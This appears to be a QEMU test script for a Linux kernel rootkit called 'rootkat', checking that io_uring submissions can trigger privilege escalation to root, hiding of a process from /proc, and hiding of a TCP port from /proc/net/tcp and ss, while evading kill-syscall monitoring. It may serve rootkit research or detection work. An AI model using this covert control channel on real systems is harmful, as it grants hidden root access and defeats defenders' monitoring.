#!/usr/bin/env bash
# Asserts: rootkat actions can be triggered via the io_uring submission
# queue (an IORING_OP_NOP SQE with magic user_data) instead of the
# kill(2) magic-signal path. Demonstrates that traditional
# syscall-level monitoring (auditd watching kill, eBPF probes on
# sys_enter_kill) misses this control surface.
#
# Three actions covered: privesc, hide-current-pid, hide-port.
set -u
cd /root/rootkat
. tests/qemu/lib.sh

dmesg -c >/dev/null 2>&1 || true
assert_zero "module loads" insmod lkm/rootkat.ko

echo "--- rootkat init log ---"
dmesg | grep -iE 'rootkat|kallsyms|io_issue|io_uring' | tail -50 || true
echo "------------------------"

# --- privesc via io_uring SQE ------------------------------------------
# Helper drops to nobody, submits the SQE, checks geteuid()==0.
assert_zero "privesc via io_uring SQE" tests/qemu/io_uring_helper privesc

# --- hide PID via io_uring SQE -----------------------------------------
# Helper submits SQE then pause()s so we can verify /proc visibility.
tests/qemu/io_uring_helper hide_pid &
HIDE_PID=$!
sleep 0.5

assert_nonzero "hidden PID NOT in /proc listing" \
	bash -c "ls /proc | grep -qx $HIDE_PID"

# Sanity: the hidden process is still alive — direct stat hits
# proc_pid_lookup which we don't intercept; it's filldir64-based
# enumeration that we hide. (Match the existing test_process_hide
# semantics.)
assert_zero "hidden PID still has /proc/<pid>/comm readable" \
	test -r /proc/$HIDE_PID/comm

kill $HIDE_PID 2>/dev/null || true
wait $HIDE_PID 2>/dev/null || true

# --- hide port via io_uring SQE ----------------------------------------
PORT=12350

# Bind a TCP listener on $PORT (no kill-magic flag — we'll hide via
# the io_uring channel instead).
exec 3< <(tests/qemu/net_helper $PORT)
read -r LINE <&3
NET_PID=$!
sleep 0.2

# Confirm baseline visibility.
assert_zero "baseline: /proc/net/tcp has port" \
	bash -c "awk 'NR>1{split(\$2,a,\":\"); printf \"%d\\n\", strtonum(\"0x\" a[2])}' /proc/net/tcp | grep -qx $PORT"

# Trigger hide via io_uring.
assert_zero "hide_port via io_uring SQE" tests/qemu/io_uring_helper hide_port $PORT

# Verify the port is now hidden from /proc/net/tcp.
assert_nonzero "post-io_uring: /proc/net/tcp omits port" \
	bash -c "awk 'NR>1{split(\$2,a,\":\"); printf \"%d\\n\", strtonum(\"0x\" a[2])}' /proc/net/tcp | grep -qx $PORT"

# And from ss (NETLINK_SOCK_DIAG path, hooked separately).
assert_nonzero "post-io_uring: ss -tln omits port" \
	bash -c "ss -tln | grep -q ':$PORT '"

kill $NET_PID 2>/dev/null || true
wait $NET_PID 2>/dev/null || true
exec 3<&-

assert_zero "module unloads" rmmod rootkat

# --- Post-unload: io_uring SQE no longer escalates ---------------------
# After rmmod the hook is gone, so the same helper invocation should NOT
# escalate (geteuid stays at the dropped uid).
if tests/qemu/io_uring_helper privesc >/dev/null 2>&1; then
	echo "FAIL: io_uring privesc still works after rmmod"
	ROOTKAT_FAIL=$((ROOTKAT_FAIL+1))
else
	echo "PASS: io_uring privesc no longer works after rmmod"
	ROOTKAT_PASS=$((ROOTKAT_PASS+1))
fi

report
